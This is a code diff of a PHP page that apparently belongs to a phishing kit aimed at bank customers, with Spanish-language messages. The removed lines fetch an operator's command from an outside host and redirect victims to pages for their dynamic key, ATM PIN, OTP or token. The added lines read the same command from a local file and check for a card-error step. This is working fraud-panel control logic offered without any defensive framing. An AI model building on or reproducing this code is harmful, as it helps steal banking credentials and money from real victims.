@@ -1,28 +1,26 @@
 <!DOCTYPE html>
 <?php
-$transactionId = $_GET['id'] ?? null;
+session_start();
 
-if ($transactionId) {
-    $url = "https://temporaletiquetes.onrender.com/dinadatos/verificaciones.php?id=" . urlencode($transactionId);
-    $json = @file_get_contents($url);
-    $data = json_decode($json, true);
-    $accion = $data['accion'] ?? '';
-
-    $rutas = [
-        "pedir_dinamica" => "dinamica-id.php",
-        "pedir_cajero"   => "ccajero-id.php",
-        "pedir_otp"      => "otp-id.php",
-        "pedir_token"    => "token-id.php",
-        "error_tc"       => "error-ccajero.php",
-        "error_logo"     => "error-id.php",
-    ];
-
-    $archivoActual = basename($_SERVER['PHP_SELF']);
-    if (isset($rutas[$accion]) && $archivoActual !== $rutas[$accion]) {
-        header("Location: " . $rutas[$accion] . "?id=" . urlencode($transactionId));
-        exit;
-    }
+$transactionId = $_SESSION['transactionId'] ?? null;
+if (!$transactionId) {
+    echo "ID de transacción no disponible.";
+    exit;
 }
+
+$path = __DIR__ . "/../verificaciones/$transactionId.json";
+if (!file_exists($path)) {
+    echo "No se encontró instrucción para esta acción.";
+    exit;
+}
+
+$data = json_decode(file_get_contents($path), true);
+if (!isset($data['accion']) || $data['accion'] !== 'error_tc') {
+    echo "Esta acción no corresponde a este paso.";
+    exit;
+}
+
+unlink($path);
 ?>
 
 <html lang="es">
